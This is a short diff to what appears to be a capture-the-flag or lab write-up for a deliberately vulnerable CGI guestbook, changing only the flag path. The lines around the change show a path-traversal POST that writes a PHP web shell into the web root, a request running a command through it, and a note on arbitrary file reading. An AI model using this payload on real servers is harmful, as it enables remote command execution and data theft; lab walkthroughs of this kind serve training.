@@ -26,7 +26,7 @@ POST /cgi-bin/save_message.pl
 last=..%2Fhtdocs%2Fshell&first=.php&comment=<?php+system($_GET['cmd']);?>
 ```
 
-Then access `/htdocs/shell.php?cmd=cat+/flag.txt`.
+Then access `/htdocs/shell.php?cmd=cat+/flag/flag`.
 
 Or, read any file on the server by passing the path as the filename to the `guestbook.pl` endpoint
 (the two scripts are intentionally chained in the kill-chain exercise).
